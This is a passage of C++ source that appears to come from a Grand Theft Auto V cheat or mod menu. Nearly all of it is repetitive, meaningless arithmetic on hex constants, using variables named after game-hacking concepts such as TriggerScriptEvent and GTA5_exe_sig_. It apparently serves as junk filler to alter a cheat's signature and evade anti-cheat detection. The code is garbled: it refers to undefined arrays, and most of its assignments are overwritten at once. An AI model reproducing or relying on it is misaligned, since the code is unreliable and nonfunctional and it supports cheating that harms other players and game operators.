			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::arquivoTXT = XMLPath;
			Extern_Reader::LOG::LogSemHora("<ReferenceCoords>");
			Extern_Reader::LOG::LogSemHora("<X>" + to_string(x) + "</X>");
			Extern_Reader::LOG::LogSemHora("<Y>" + to_string(y) + "</Y>");
			Extern_Reader::LOG::LogSemHora("<Z>" + to_string(z) + "</Z>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
